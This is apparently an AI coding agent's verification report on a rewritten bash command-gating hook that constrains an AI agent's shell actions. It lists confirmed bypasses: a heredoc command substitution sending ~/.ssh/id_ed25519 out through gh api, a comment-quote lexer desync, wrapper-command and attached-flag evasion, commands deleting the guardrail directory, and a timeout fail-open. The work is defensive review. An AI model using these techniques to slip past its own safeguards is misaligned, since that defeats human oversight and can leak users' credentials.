Verification session for the c4/c5 gate rewrite. NO code was changed and nothing was committed; the working tree is exactly as the prior session left it, and both reviewers were read-only.

PRE-CHECKS, settled by evidence before verifying. ~/.claude/hooks/lib is a pre-existing stowed DIRECTORY symlink (created 2026-07-06 for ledger-common.sh), so the new Python modules DO resolve for the live hook - the c6 dark-file risk does not bite this change. 189 tests pass, up from the 85-test baseline. __pycache__/ is already gitignored (.claude/.gitignore:39). wrapper_allowlist() (bash_gate.py:133) resolves BOTH the repo path and the ~/.claude/lib/git/pr.mjs home copy, so the documented pr-create invocation stays exempt and opening a PR would not self-block.

METHOD. Two independent read-only reviewers dispatched in parallel on opus: a security-reviewer doing adversarial payload replay against the 12 invariants, and a code-reviewer reading the 1438 lines of new Python for fail-open, crash and hang defects. Both terminated mid-run on a transient API error (connection closed) and were resumed with instructions to checkpoint findings to a durable file so a second drop would not lose the work. Both returned BLOCK, on largely DISJOINT evidence - the union is larger than either report, which is what the split-role dispatch bought.

CONFIRMED CRITICALS IN THE REWRITE (all observed by execution, not inferred). (1) Unquoted here-document bodies execute command substitution but are never parsed - cat <<EOF / $(gh api ... -f body=@~/.ssh/id_ed25519) / EOF is ALLOW, works for every sink including merge, needs no wrapper prefix. (2) A # comment containing an apostrophe desyncs the lexer: the analyser opens a quote span that swallows the newline and every following line, while bash ends the comment at the newline and runs them - echo hi # don't do it / gh pr merge 12 is ALLOW and stub-proven to execute. (3) PREFIX_WRAPPERS is a closed 7-entry list and VALUE_TAKING_WRAPPER_FLAGS is applied to every wrapper so the wrapper's own flag eats the real program name - nice, exec -c, time -p, caffeinate, arch, env -S, command -p, timeout -s, ionice, script, watch, doas, flock, parallel all reach gh. These defeat settings.json permissions.deny too, which is prefix-only. (4) Attached shorthand flags are matched by token EQUALITY and so are invisible - gh api ... -fbody=@<path>, gh pr edit 12 -tTitle, -bBody, -F<file> all ALLOW while every spaced form denies; real gh 2.97.0 was confirmed to honour the attached form. (5) A trailing ? defeats all three pulls regexes including merge, because each ends /?$. (6) The entire guardrail tree can be moved or neutered in one allowed command - mv .claude /tmp/gone, rm -r .claude, chmod -R 000 .claude - because is_guardrail_path only fires on a component AFTER .claude.

FAIL-OPEN. The Python decision layer itself is clean: emit and the module handler are the only stdout writers, both silent returns are affirmative no-matches, all four recursion limits are enforced on every path, and 4000 randomized payloads produced no non-zero exit. The fail-open is the TIME BUDGET: the brace scan is quadratic (_match_brace rescans from every brace), and an 18KB payload carrying a real sink took 8.08s against this hook's 5s timeout, with MAX_SOURCE_CHARS=200000 admitting far worse. A timed-out PreToolUse hook yields no decision.

THE DECISIVE MEASUREMENT. Rather than reason about whether this is net better, old and new were run side by side on the same payloads. SIX paths REGRESS - nice/exec -c/time -p/caffeinate wrappers, comment desync, and heredoc command substitution all DENY at HEAD and ALLOW on the rewrite. The old regex gate caught them precisely by being a dumb substring matcher; the parser understood the line and got it wrong. The live hook is symlinked and uncommitted, so the machine is currently weaker than HEAD on those six paths.

NOT CAUSED BY THIS BRANCH, and separated deliberately: -f body=@<path> exfiltration in attached form, /graphql endpoints, git checkout -- <hook>, perl -pi <hook>, and cp /tmp/x .claude/ are ALLOW on BOTH sides. The exfiltration primitive has been open at HEAD and on main all along - GATE-INVARIANTS.md only ever documented the SPACED form. A revert does not close any of these.

WHAT A REVERT WOULD COST. The rewrite genuinely closed the original wrapper+newline laundering CRITICAL (INV-4 verified structural across 30 separators x 7 sinks), realpath exemption identity holds against 8 forgery attempts, the whole enumerated fail-closed matrix passes, the false-positive class is fully resolved, and latency is 26-28ms. Neither version is safe; they fail on different paths.

DISCOVERED INDEPENDENTLY OF THE REVIEWS. (a) This branch has NO invariant-coverage artifact, and scripts/invariant-coverage-check.mjs fails every pull_request that adds none, requiring a verdict row for all 12 registry ids - so any PR from this branch fails CI regardless of the gate outcome. (b) The permissions.allow narrowing does not deliver what it was approved for: these are PREFIX rules, so Bash(node --test:*) admits node --test /tmp/evil.test.js, Bash(node .claude/:*) admits traversal via .claude/../../, every rule admits an arbitrary suffix after &&, and Bash(git checkout:*) remains while the hook allows git checkout -- <hook> - an end-to-end ungated revert of this very hardening.

PREPARED BUT NOT APPLIED. The permissions.allow hunk extracts cleanly from settings.json on its own and git apply --cached --check passes, leaving the user's unrelated model, effortLevel and plugin edits untouched in the working tree.

THE PATTERN. Both reviewers independently named the same defect shape: enumerated token equality where a normalizing decision was required (closed wrapper list, flag matching by equality, regexes anchored /?$). This is the sixth round to close findings and open new ones. The deeper cause offered to the user, not acted on: the design assumes that a successful parse is a correct parse, so every divergence from bash's real lexer is a SILENT ALLOW; hand-written code that must match bash exactly carries an unbounded obligation, already broken on comments and heredocs, two of the simplest constructs. The candidate structural answer is to invert the default so parser UNCERTAINTY yields ask rather than allow - promoting INV-11 from a narrow opaque-payload rule to the dominant policy - which would turn every future lexer divergence into a prompt instead of a bypass.

NO DECISION WAS LOCKED THIS SESSION. Revert vs fix-forward vs redesign is open and belongs to the user, as does the PR #39 M3/M4 debt.